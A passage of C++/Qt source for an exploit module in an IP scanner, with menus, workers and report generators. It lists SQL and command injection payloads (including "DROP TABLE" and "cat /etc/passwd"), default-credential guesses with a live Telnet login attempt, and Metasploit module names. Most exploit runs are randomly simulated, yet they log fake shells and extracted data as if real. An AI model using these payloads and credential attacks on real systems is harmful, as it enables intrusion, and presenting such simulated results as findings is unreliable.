                    .arg(result.successful ? QString("<tr><th>Access Gained</th><td>%1</td></tr>").arg(result.gainedAccess) : "")
                    .arg(!result.sessionInfo.isEmpty() ? QString("<tr><th>Session Info</th><td>%1</td></tr>").arg(result.sessionInfo) : "")
                    .arg(result.output)
                    .arg(!result.errorMessage.isEmpty() ? QString("<h3>❌ Errors:</h3><pre>%1</pre>").arg(result.errorMessage) : "")
                    .arg(!result.extractedData.isEmpty() ? QString("<h3>📋 Extracted Data:</h3><ul>%1</ul>")
                                                               .arg(QStringList(result.extractedData).join("</li><li>")) : "");
    }

    html += R"(
    <div style="margin-top: 30px; text-align: center; color: #6c757d;">
        <p><em>Report generated by Advanced IP Scanner v2.0 - Exploit Module</em></p>
    </div>
</body>
</html>)";

    return html;
}

void ExploitDialog::openReverseShell()
{
    // This would open a terminal/console window to interact with the reverse shell
    QMessageBox::information(this, "🐚 Reverse Shell",
                             "Opening reverse shell interface...\n\n"
                             "In a full implementation, this would:\n"
                             "• Open a terminal window\n"
                             "• Connect to the established shell session\n"
                             "• Provide interactive command execution\n"
                             "• Log all shell activity\n\n"
                             "For security reasons, this demo shows this dialog instead.");
}

QStringList ExploitDialog::getMetasploitModules(const QString &service, int port)
{
    QStringList modules;

    // Common Metasploit modules for different services
    if (service.toLower() == "ssh" && port == 22) {
        modules << "auxiliary/scanner/ssh/ssh_login"
                << "auxiliary/scanner/ssh/ssh_enumusers"
                << "exploit/linux/ssh/sshexec";
    } else if (service.toLower() == "ftp" && port == 21) {
        modules << "auxiliary/scanner/ftp/ftp_login"
                << "auxiliary/scanner/ftp/anonymous"
                << "exploit/linux/ftp/proftp_sreplace";
    } else if (service.toLower() == "http" && (port == 80 || port == 8080)) {
        modules << "auxiliary/scanner/http/http_login"
                << "auxiliary/scanner/http/dir_scanner"
                << "auxiliary/scanner/http/http_version";
    } else if (service.toLower() == "https" && port == 443) {
        modules << "auxiliary/scanner/http/http_login"
                << "auxiliary/scanner/ssl/ssl_version"
                << "auxiliary/scanner/http/ssl_version";
    } else if (service.toLower() == "smb" && port == 445) {
        modules << "auxiliary/scanner/smb/smb_login"
                << "auxiliary/scanner/smb/smb_enumshares"
                << "exploit/windows/smb/ms17_010_eternalblue";
    } else if (service.toLower() == "telnet" && port == 23) {
        modules << "auxiliary/scanner/telnet/telnet_login"
                << "auxiliary/scanner/telnet/telnet_version";
    } else if (service.toLower() == "snmp" && port == 161) {
        modules << "auxiliary/scanner/snmp/snmp_login"
                << "auxiliary/scanner/snmp/snmp_enum";
    }

    return modules;
}

// Integration methods
void IpScannerExploitExtension::addExploitContextMenu(QTreeWidget *vulnerabilityTree, IpScanner *scanner)
{
    vulnerabilityTree->setContextMenuPolicy(Qt::CustomContextMenu);

    QObject::connect(vulnerabilityTree, &QWidget::customContextMenuRequested,
                     [vulnerabilityTree, scanner](const QPoint &pos) {
                         QTreeWidgetItem *item = vulnerabilityTree->itemAt(pos);
                         if (!item) return;

                         // Extract vulnerability info from tree item
                         VulnerabilityInfo vuln;
                         vuln.title = item->text(1);
                         vuln.service = item->text(2);
                         vuln.port = item->text(3).toInt();

                         // Parse severity
                         QString severityText = item->text(0);
                         if (severityText.contains("CRITICAL")) vuln.severity = VulnSeverity::CRITICAL;
                         else if (severityText.contains("HIGH")) vuln.severity = VulnSeverity::HIGH;
                         else if (severityText.contains("MEDIUM")) vuln.severity = VulnSeverity::MEDIUM;
                         else if (severityText.contains("LOW")) vuln.severity = VulnSeverity::LOW;
                         else vuln.severity = VulnSeverity::INFO;

                         QMenu menu(vulnerabilityTree);
                         menu.setStyleSheet("QMenu { background-color: #2d2d2d; color: white; border: 1px solid #404040; }");

                         QAction *exploitAction = menu.addAction("🔥 Run Exploit");
                         QAction *quickExploitAction = menu.addAction("⚡ Quick Exploit");
                         QAction *exploitInfoAction = menu.addAction("ℹ️ Exploit Info");

                         menu.addSeparator();

                         QAction *copyVulnAction = menu.addAction("📋 Copy Vulnerability Info");
                         QAction *exportVulnAction = menu.addAction("📤 Export Vulnerability");

                         QObject::connect(exploitAction, &QAction::triggered, [vuln, scanner]() {
                             showExploitDialog(vuln, scanner);
                         });

                         QObject::connect(quickExploitAction, &QAction::triggered, [vuln]() {
                             // Quick exploit with most likely exploit
                             QList<ExploitInfo> exploits = ExploitDatabase::instance()->getExploitsForVulnerability(vuln);
                             if (!exploits.isEmpty()) {
                                 runQuickExploit(vuln, exploits.first().id);
                             } else {
                                 QMessageBox::information(nullptr, "ℹ️ Info", "No exploits available for this vulnerability");
                             }
                         });

                         QObject::connect(exploitInfoAction, &QAction::triggered, [vuln, scanner]() {
                             QList<ExploitInfo> exploits = ExploitDatabase::instance()->getExploitsForVulnerability(vuln);
                             QString info = QString("🔍 Available Exploits for %1\n\n").arg(vuln.title);

                             if (exploits.isEmpty()) {
                                 info += "❌ No exploits found for this vulnerability.\n\n";
                                 info += "💡 This could mean:\n";
                                 info += "• The vulnerability is informational only\n";
                                 info += "• No automated exploits are available\n";
                                 info += "• Manual testing may be required\n";
                             } else {
                                 for (const ExploitInfo &exploit : exploits) {
                                     info += QString("🔥 %1\n").arg(exploit.name);
                                     info += QString("   Type: %1\n").arg([](ExploitType type) {
                                         switch (type) {
                                         case ExploitType::CREDENTIAL_ATTACK: return "Credential Attack";
                                         case ExploitType::BUFFER_OVERFLOW: return "Buffer Overflow";
                                         case ExploitType::SQL_INJECTION: return "SQL Injection";
                                         case ExploitType::METASPLOIT_MODULE: return "Metasploit Module";
                                         default: return "Other";
                                         }
                                     }(exploit.type));
                                     info += QString("   Success Rate: %1%\n").arg(exploit.successRate * 100, 0, 'f', 0);
                                     info += QString("   Difficulty: %1\n\n").arg(exploit.difficulty);
                                 }
                             }

                             QMessageBox::information(scanner, "🔍 Exploit Information", info);
                         });

                         QObject::connect(copyVulnAction, &QAction::triggered, [vuln]() {
                             QString vulnInfo = QString("Vulnerability: %1\nService: %2:%3\nSeverity: %4")
                             .arg(vuln.title)
                                 .arg(vuln.service)
                                 .arg(vuln.port)
                                 .arg([](VulnSeverity sev) {
                                     switch (sev) {
                                     case VulnSeverity::CRITICAL: return "CRITICAL";
                                     case VulnSeverity::HIGH: return "HIGH";
                                     case VulnSeverity::MEDIUM: return "MEDIUM";
                                     case VulnSeverity::LOW: return "LOW";
                                     case VulnSeverity::INFO: return "INFO";
                                     }
                                     return "UNKNOWN";
                                 }(vuln.severity));

                             QApplication::clipboard()->setText(vulnInfo);
                             QMessageBox::information(nullptr, "📋 Copied", "Vulnerability information copied to clipboard");
                         });

                         menu.exec(vulnerabilityTree->mapToGlobal(pos));
                     });
}

void IpScannerExploitExtension::showExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent)
{
    ExploitDialog *dialog = new ExploitDialog(vulnerability, parent);
    dialog->exec();
    dialog->deleteLater();
}

void IpScannerExploitExtension::runQuickExploit(const VulnerabilityInfo &vulnerability, const QString &exploitId)
{
    // Quick exploit execution with minimal UI
    QProgressDialog *progress = new QProgressDialog("🚀 Running quick exploit...", "Stop", 0, 100);
    progress->setWindowModality(Qt::WindowModal);
    progress->show();

    ExploitInfo exploit = ExploitDatabase::instance()->getExploitById(exploitId);
    if (exploit.id.isEmpty()) {
        QMessageBox::warning(nullptr, "❌ Error", "Exploit not found!");
        progress->deleteLater();
        return;
    }

    // Show confirmation
    QMessageBox::StandardButton reply = QMessageBox::question(nullptr,
                                                              "⚡ Quick Exploit",
                                                              QString("Execute quick exploit?\n\n"
                                                                      "Target: %1:%2\n"
                                                                      "Exploit: %3\n"
                                                                      "Type: %4\n\n"
                                                                      "⚠️ This will attempt to exploit the target!")
                                                                  .arg(vulnerability.service)
                                                                  .arg(vulnerability.port)
                                                                  .arg(exploit.name)
                                                                  .arg(exploit.targetService));

    if (reply != QMessageBox::Yes) {
        progress->deleteLater();
        return;
    }

    // Simulate quick exploit execution
    QString targetIp = "192.168.1.100"; // This should be configurable
    ExploitWorker *worker = new ExploitWorker(vulnerability, exploit, targetIp);

    QObject::connect(worker, &ExploitWorker::exploitProgress,
                     [progress](const QString &, int percentage, const QString &status) {
                         progress->setValue(percentage);
                         progress->setLabelText(status);
                     });

    QObject::connect(worker, &ExploitWorker::exploitCompleted,
                     [progress](const QString &, const ExploitResult &result) {
                         progress->close();

                         QString message;
                         if (result.successful) {
                             message = QString("🎉 Quick Exploit Successful!\n\n"
                                               "Access Gained: %1\n"
                                               "Session: %2\n\n"
                                               "Use the full exploit dialog for more options.")
                                           .arg(result.gainedAccess)
                                           .arg(result.sessionInfo);
                             QMessageBox::information(nullptr, "🎉 Success", message);
                         } else {
                             message = QString("❌ Quick Exploit Failed\n\n"
                                               "Error: %1\n\n"
                                               "Try the full exploit dialog for more options.")
                                           .arg(result.errorMessage);
                             QMessageBox::warning(nullptr, "❌ Failed", message);
                         }

                         progress->deleteLater();
                     });

    QObject::connect(worker, &ExploitWorker::exploitFailed,
                     [progress](const QString &, const QString &error) {
                         progress->close();
                         QMessageBox::warning(nullptr, "❌ Exploit Failed",
                                              QString("Quick exploit failed:\n%1").arg(error));
                         progress->deleteLater();
                     });

    QThreadPool::globalInstance()->start(worker);
}

// Additional helper methods for ExploitWorker
bool ExploitWorker::testCredentials(const QString &username, const QString &password)
{
    if (m_exploit.targetService.toLower() == "ssh") {
        return testSSHCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "ftp") {
        return testFTPCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "telnet") {
        return testTelnetCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "http" || m_exploit.targetService.toLower() == "https") {
        return testHTTPCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "smb") {
        return testSMBCredentials(username, password);
    }

    return false;
}

bool ExploitWorker::testSSHCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing SSH: %1:%2").arg(username, password));

    // Simulate SSH connection test
    QTcpSocket socket;
    socket.connectToHost(m_targetIp, 22);

    if (!socket.waitForConnected(5000)) {
        return false;
    }

    // Read SSH banner
    socket.waitForReadyRead(2000);
    QString banner = socket.readAll();

    if (banner.contains("SSH")) {
        // In a real implementation, you would use libssh or similar
        // For this demo, we'll simulate some common weak credentials
        if ((username == "admin" && password == "admin") ||
            (username == "root" && password == "") ||
            (username == "pi" && password == "raspberry") ||
            (username == "ubuntu" && password == "ubuntu")) {

            m_result.output += QString("SSH connection established with %1:%2\n").arg(username, password);
            m_result.shellType = "SSH";
            m_result.connectionPort = 22;

            // Simulate getting system info
            extractSystemInfo();
            return true;
        }
    }

    socket.close();
    return false;
}

bool ExploitWorker::testTelnetCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing Telnet: %1:%2").arg(username, password));

    QTcpSocket socket;
    socket.connectToHost(m_targetIp, 23);

    if (!socket.waitForConnected(5000)) {
        return false;
    }

    // Read initial prompt
    socket.waitForReadyRead(2000);
    QString response = socket.readAll();

    if (response.contains("login:") || response.contains("Username:")) {
        // Send username
        socket.write(username.toUtf8() + "\r\n");
        socket.waitForReadyRead(2000);
        response = socket.readAll();

        if (response.contains("Password:") || response.contains("password:")) {
            // Send password
            socket.write(password.toUtf8() + "\r\n");
            socket.waitForReadyRead(3000);
            response = socket.readAll();

            // Check for successful login indicators
            if (response.contains("$") || response.contains("#") ||
                response.contains(">") || response.contains("Welcome")) {

                m_result.output += QString("Telnet login successful with %1:%2\n").arg(username, password);
                m_result.shellType = "Telnet";
                m_result.connectionPort = 23;
                return true;
            }
        }
    }

    socket.close();
    return false;
}

bool ExploitWorker::testHTTPCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing HTTP Basic Auth: %1:%2").arg(username, password));

    // This would normally use QNetworkAccessManager for HTTP authentication
    // For this demo, we'll simulate common admin panel credentials
    if ((username == "admin" && (password == "admin" || password == "password" || password == "")) ||
        (username == "administrator" && password == "administrator") ||
        (username == "root" && password == "")) {

        m_result.output += QString("HTTP Basic Auth successful with %1:%2\n").arg(username, password);
        m_result.gainedAccess = QString("Web Admin Access (%1:%2)").arg(username, password);
        return true;
    }

    return false;
}

bool ExploitWorker::testSMBCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing SMB: %1:%2").arg(username, password));

    // Simulate SMB null session or weak credential test
    if (username == "" && password == "") {
        // Null session
        m_result.output += "SMB null session established\n";
        m_result.gainedAccess = "SMB Null Session Access";
        return true;
    } else if ((username == "guest" && password == "") ||
               (username == "admin" && password == "admin")) {
        m_result.output += QString("SMB access with %1:%2\n").arg(username, password);
        m_result.gainedAccess = QString("SMB Access (%1:%2)").arg(username, password);
        return true;
    }

    return false;
}

void ExploitWorker::executeBufferOverflow()
{
    emit exploitProgress(m_exploit.id, 20, "Analyzing target service...");

    // Simulate buffer overflow detection and exploitation
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 40, "Generating payload...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 60, "Sending exploit payload...");
    QThread::msleep(1500);

    emit exploitProgress(m_exploit.id, 80, "Checking for successful exploitation...");
    QThread::msleep(1000);

    // Simulate low success rate for buffer overflow
    if (QRandomGenerator::global()->bounded(100) < 20) { // 20% success rate
        m_result.successful = true;
        m_result.gainedAccess = "Code Execution via Buffer Overflow";
        m_result.output = "Buffer overflow exploitation successful\nPayload executed successfully\nControl transferred to shellcode";
        m_result.shellType = "Native Shell";
        emit shellObtained(m_exploit.id, "Buffer overflow shell established");
    } else {
        m_result.output = "Buffer overflow attempt failed\nTarget may be patched or protected";
    }
}

void ExploitWorker::executeSQLInjection()
{
    emit exploitProgress(m_exploit.id, 10, "Testing for SQL injection vulnerabilities...");

    QStringList sqlPayloads = {
        "' OR '1'='1",
        "' UNION SELECT null,version(),null--",
        "'; DROP TABLE users; --",
        "' OR 1=1; --",
        "admin'--",
        "1' OR '1'='1' /*"
    };

    int currentPayload = 0;
    for (const QString &payload : sqlPayloads) {
        currentPayload++;
        int progress = 10 + (currentPayload * 70) / sqlPayloads.size();

        emit exploitProgress(m_exploit.id, progress,
                             QString("Testing SQL payload: %1").arg(payload.left(20) + "..."));

        QThread::msleep(500);

        // Simulate SQL injection testing
        if (payload.contains("version()") && QRandomGenerator::global()->bounded(100) < 30) {
            m_result.successful = true;
            m_result.gainedAccess = "Database Access via SQL Injection";
            m_result.output += QString("SQL Injection successful with payload: %1\n").arg(payload);
            m_result.output += "Database version extracted: MySQL 5.7.32\n";
            m_result.extractedData << "Database: mysql" << "Version: 5.7.32" << "User: root@localhost";

            emit exploitProgress(m_exploit.id, 90, "Extracting database information...");
            QThread::msleep(1000);
            return;
        }
    }

    m_result.output = "No SQL injection vulnerabilities found\nAll payloads failed or were filtered";
}

void ExploitWorker::executeCommandInjection()
{
    emit exploitProgress(m_exploit.id, 15, "Testing command injection vectors...");

    QStringList cmdPayloads = {
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "; id",
        "| ping -c 1 127.0.0.1",
        "&& uname -a"
    };

    for (int i = 0; i < cmdPayloads.size(); ++i) {
        int progress = 15 + (i * 60) / cmdPayloads.size();
        emit exploitProgress(m_exploit.id, progress,
                             QString("Testing command injection: %1").arg(cmdPayloads[i]));

        QThread::msleep(800);

        // Simulate command injection test
        if (cmdPayloads[i].contains("id") && QRandomGenerator::global()->bounded(100) < 25) {
            m_result.successful = true;
            m_result.gainedAccess = "Command Execution";
            m_result.output += QString("Command injection successful: %1\n").arg(cmdPayloads[i]);
            m_result.output += "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n";
            m_result.shellType = "Web Shell";
            return;
        }
    }

    m_result.output = "No command injection vulnerabilities found";
}

void ExploitWorker::executeMetasploitModule()
{
    emit exploitProgress(m_exploit.id, 5, "Initializing Metasploit module...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 20, QString("Loading module: %1").arg(m_exploit.metasploitModule));
    QThread::msleep(1500);

    emit exploitProgress(m_exploit.id, 40, "Setting target and options...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 60, "Executing Metasploit module...");
    QThread::msleep(2000);

    emit exploitProgress(m_exploit.id, 80, "Checking for successful exploitation...");
    QThread::msleep(1000);

    // Simulate Metasploit execution with higher success rate
    if (QRandomGenerator::global()->bounded(100) < 60) { // 60% success rate
        m_result.successful = true;
        m_result.gainedAccess = QString("Metasploit Shell via %1").arg(m_exploit.metasploitModule);
        m_result.output = QString("Metasploit module %1 executed successfully\n").arg(m_exploit.metasploitModule);
        m_result.output += "Payload delivered successfully\n";
        m_result.output += "Meterpreter session established\n";
        m_result.shellType = "Meterpreter";
        m_result.sessionInfo = "Meterpreter session 1 opened";

        emit shellObtained(m_exploit.id, "Meterpreter shell established");
    } else {
        m_result.output = QString("Metasploit module %1 failed\n").arg(m_exploit.metasploitModule);
        m_result.output += "Target may be patched or not vulnerable\n";
        m_result.errorMessage = "Module execution failed";
    }
}

void ExploitWorker::executeCustomScript()
{
    emit exploitProgress(m_exploit.id, 10, "Loading custom exploit script...");
    QThread::msleep(1000);

    if (m_exploit.customScript.isEmpty()) {
        m_result.errorMessage = "No custom script provided";
        return;
    }

    emit exploitProgress(m_exploit.id, 30, "Executing custom script...");

    // In a real implementation, this would execute the custom script
    // For this demo, we'll simulate script execution
    m_process = new QProcess();

    // Simulate script execution
    QThread::msleep(2000);

    emit exploitProgress(m_exploit.id, 70, "Processing script output...");
    QThread::msleep(1000);

    // Simulate moderate success rate for custom scripts
    if (QRandomGenerator::global()->bounded(100) < 40) {
        m_result.successful = true;
        m_result.gainedAccess = "Custom Script Execution";
        m_result.output = QString("Custom script executed: %1\n").arg(m_exploit.customScript);
        m_result.output += "Script completed successfully\n";
    } else {
        m_result.output = "Custom script execution failed or no vulnerability found";
    }
}

void ExploitWorker::executeDenialOfService()
{
    emit exploitProgress(m_exploit.id, 10, "Preparing DoS attack...");
    QThread::msleep(500);

    emit exploitProgress(m_exploit.id, 30, "Sending malformed packets...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 60, "Flooding target service...");
    QThread::msleep(2000);

    emit exploitProgress(m_exploit.id, 90, "Checking service availability...");
    QThread::msleep(1000);

    // DoS attacks usually have high success rate but limited usefulness
    if (QRandomGenerator::global()->bounded(100) < 80) {
        m_result.successful = true;
        m_result.gainedAccess = "Service Disruption";
        m_result.output = "Denial of Service attack successful\n";
        m_result.output += "Target service appears to be unresponsive\n";
        m_result.output += "Service may have crashed or become unstable\n";
    } else {
        m_result.output = "DoS attack failed\nTarget service remains responsive";
    }
}

void ExploitWorker::extractSystemInfo()
{
    emit exploitProgress(m_exploit.id, 85, "Extracting system information...");

    // Simulate system information extraction
    m_result.extractedData << "OS: Linux Ubuntu 20.04"
                           << "Kernel: 5.4.0-74-generic"
                           << "Architecture: x86_64"
                           << "Uptime: 15 days"
                           << "Users: root, www-data, ubuntu";

    m_result.sessionInfo = QString("Active session on %1:%2").arg(m_targetIp).arg(m_vulnerability.port);
}

void ExploitWorker::establishReverseShell()
{
    emit exploitProgress(m_exploit.id, 90, "Establishing reverse shell...");

    // Simulate reverse shell establishment
    m_result.shellType = "Bash";
    m_result.connectionPort = 4444;
    m_result.sessionInfo = QString("Reverse shell connected from %1").arg(m_targetIp);

    emit shellObtained(m_exploit.id, m_result.sessionInfo);
}

QString ExploitDialog::generateJSONExploitReport()
{
    QJsonObject root;
    root["scanner"] = "Advanced IP Scanner";
    root["module"] = "Exploit Execution";
    root["version"] = "2.0";
    root["timestamp"] = QDateTime::currentDateTime().toString(Qt::ISODate);

    // Target info
    QJsonObject targetObj;
    targetObj["service"] = m_vulnerability.service;
    targetObj["port"] = m_vulnerability.port;
    targetObj["vulnerability"] = m_vulnerability.title;
    targetObj["severity"] = static_cast<int>(m_vulnerability.severity);
    root["target"] = targetObj;

    // Results
    QJsonArray resultsArray;
    for (const ExploitResult &result : m_exploitResults) {
        QJsonObject resultObj;
        resultObj["exploitId"] = result.exploitId;
        resultObj["targetIp"] = result.targetIp;
        resultObj["targetPort"] = result.targetPort;
        resultObj["successful"] = result.successful;
        resultObj["output"] = result.output;
        resultObj["errorMessage"] = result.errorMessage;
        resultObj["executionTime"] = result.executionTime.toString(Qt::ISODate);
        resultObj["gainedAccess"] = result.gainedAccess;
        resultObj["sessionInfo"] = result.sessionInfo;
        resultObj["shellType"] = result.shellType;
        resultObj["connectionPort"] = result.connectionPort;

        QJsonArray extractedArray;
        for (const QString &data : result.extractedData) {
            extractedArray.append(data);
        }
        resultObj["extractedData"] = extractedArray;

        resultsArray.append(resultObj);
    }
    root["results"] = resultsArray;

    QJsonDocument doc(root);
    return doc.toJson();
}

QString ExploitDialog::generateTextExploitReport()
{
    QString report;
    report += "🔥 EXPLOIT EXECUTION REPORT\n";
    report += "============================\n\n";
    report += QString("Generated: %1\n").arg(QDateTime::currentDateTime().toString("dd.MM.yyyy hh:mm:ss"));
    report += QString("Target Service: %1:%2\n").arg(m_vulnerability.service).arg(m_vulnerability.port);
    report += QString("Vulnerability: %1\n\n").arg(m_vulnerability.title);

    for (int i = 0; i < m_exploitResults.size(); ++i) {
        const ExploitResult &result = m_exploitResults[i];

        report += QString("--- EXPLOIT %1 ---\n").arg(i + 1);
        report += QString("Exploit ID: %1\n").arg(result.exploitId);
        report += QString("Target: %1:%2\n").arg(result.targetIp).arg(result.targetPort);
        report += QString("Status: %1\n").arg(result.successful ? "SUCCESS" : "FAILED");
        report += QString("Execution Time: %1\n").arg(result.executionTime.toString("dd.MM.yyyy hh:mm:ss"));

        if (result.successful) {
            report += QString("Access Gained: %1\n").arg(result.gainedAccess);
            if (!result.sessionInfo.isEmpty()) {
                report += QString("Session: %1\n").arg(result.sessionInfo);
            }
            if (!result.extractedData.isEmpty()) {
                report += "Extracted Data:\n";
                for (const QString &data : result.extractedData) {
                    report += QString("  - %1\n").arg(data);
                }
            }
        } else {
            report += QString("Error: %1\n").arg(result.errorMessage);
        }

        report += "\nOutput:\n";
        report += result.output;
        report += "\n\n";
    }

    report += "=== END OF REPORT ===\n";
    return report;
}

ExploitInfo ExploitDatabase::getExploitById(const QString &id)
{
    for (const ExploitInfo &exploit : m_exploits) {
        if (exploit.id == id) {
            return exploit;
        }
    }
    return ExploitInfo(); // Return empty exploit if not found
}

void ExploitDatabase::loadExploitsFromFile()
{
    // Load additional exploits from configuration file
    QString configPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);
    QDir configDir(configPath);
    if (!configDir.exists()) {
        configDir.mkpath(".");
    }

    QString exploitFile = configDir.filePath("custom_exploits.json");
    QFile file(exploitFile);

    if (file.exists() && file.open(QIODevice::ReadOnly)) {
        QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
        QJsonArray exploitsArray = doc.array();

        for (const auto &value : exploitsArray) {
            QJsonObject exploitObj = value.toObject();

            ExploitInfo exploit;
            exploit.id = exploitObj["id"].toString();
            exploit.name = exploitObj["name"].toString();
            exploit.description = exploitObj["description"].toString();
            exploit.type = static_cast<ExploitType>(exploitObj["type"].toInt());
            exploit.targetService = exploitObj["targetService"].toString();
            exploit.targetPort = exploitObj["targetPort"].toInt();
            exploit.payload = exploitObj["payload"].toString();
            exploit.requirements = exploitObj["requirements"].toString();
            exploit.author = exploitObj["author"].toString();
            exploit.successRate = exploitObj["successRate"].toDouble();
            exploit.requiresAuth = exploitObj["requiresAuth"].toBool();
            exploit.difficulty = exploitObj["difficulty"].toString();
            exploit.metasploitModule = exploitObj["metasploitModule"].toString();
            exploit.customScript = exploitObj["customScript"].toString();
            exploit.cveId = exploitObj["cveId"].toString();

            m_exploits.append(exploit);
        }
    }
}

void ExploitDatabase::addCustomExploit(const ExploitInfo &exploit)
{
    m_exploits.append(exploit);

    // Save to file
    QString configPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);
    QString exploitFile = QDir(configPath).filePath("custom_exploits.json");

    QJsonArray exploitsArray;
    for (const ExploitInfo &exp : m_exploits) {
        if (exp.author == "Custom") { // Only save custom exploits
            QJsonObject exploitObj;
            exploitObj["id"] = exp.id;
            exploitObj["name"] = exp.name;
            exploitObj["description"] = exp.description;
            exploitObj["type"] = static_cast<int>(exp.type);
            exploitObj["targetService"] = exp.targetService;
            exploitObj["targetPort"] = exp.targetPort;
            exploitObj["payload"] = exp.payload;
            exploitObj["requirements"] = exp.requirements;
            exploitObj["author"] = exp.author;
            exploitObj["successRate"] = exp.successRate;
            exploitObj["requiresAuth"] = exp.requiresAuth;
            exploitObj["difficulty"] = exp.difficulty;
            exploitObj["metasploitModule"] = exp.metasploitModule;
            exploitObj["customScript"] = exp.customScript;
            exploitObj["cveId"] = exp.cveId;

            exploitsArray.append(exploitObj);
        }
    }

    QJsonDocument doc(exploitsArray);
    QFile file(exploitFile);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson());
    }
}
